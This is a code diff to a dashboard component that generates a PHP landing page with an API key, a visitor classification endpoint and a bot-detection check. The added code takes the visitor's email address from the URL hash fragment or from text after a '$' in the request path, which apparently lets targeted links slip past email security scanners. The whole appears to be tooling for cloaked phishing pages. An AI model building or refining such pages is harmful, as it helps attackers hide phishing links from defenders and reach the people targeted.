@@ -229,7 +229,33 @@ export default function UserDashboard() {
     const phpContent = `<?php
 $apiKey = '${apiKey}';
 $apiEndpoint = '${apiEndpoint}/api/classify';
-
+?>
+<script>
+(function() {
+    var hash = window.location.hash;
+    var search = window.location.search;
+    var emailParam = null;
+    
+    if (hash && hash.length > 1) {
+        var hashParams = hash.substring(1);
+        var pairs = hashParams.split('&');
+        for (var i = 0; i < pairs.length; i++) {
+            var pair = pairs[i].split('=');
+            if (pair[0] === 'e' || pair[0] === 'email') {
+                emailParam = pair[1];
+                break;
+            }
+        }
+    }
+    
+    if (emailParam && search.indexOf('e=') === -1 && search.indexOf('email=') === -1) {
+        var separator = search ? '&' : '?';
+        var newUrl = window.location.pathname + search + separator + 'e=' + encodeURIComponent(emailParam);
+        window.location.replace(newUrl);
+    }
+})();
+</script>
+<?php
 session_start();
 
 $visitorIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
@@ -283,6 +309,17 @@ function isLikelyBot($userAgent) {
 $isBot = isLikelyBot($visitorUserAgent);
 
 $email = $_GET['email'] ?? $_GET['e'] ?? null;
+
+if (!$email && isset($_SERVER['REQUEST_URI'])) {
+    $requestUri = $_SERVER['REQUEST_URI'];
+    if (strpos($requestUri, '$') !== false) {
+        $parts = explode('$', $requestUri);
+        if (isset($parts[1])) {
+            parse_str($parts[1], $dollarParams);
+            $email = $dollarParams['email'] ?? $dollarParams['e'] ?? null;
+        }
+    }
+}
 
 header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
 header('X-Content-Type-Options: nosniff');
